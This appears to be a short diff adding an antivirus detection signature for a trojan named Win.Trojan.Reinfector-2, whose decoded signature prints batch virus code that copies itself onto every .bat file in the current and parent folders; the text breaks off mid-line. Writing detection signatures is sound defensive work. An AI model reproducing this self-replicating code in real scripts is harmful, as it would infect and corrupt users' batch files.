@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.Reinfector-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+
+for %%i in (*.bat ../*.bat) do copy %%i+%0 %%i>nul
+rem Reinfector # 4
+echo echo Your computer is infec
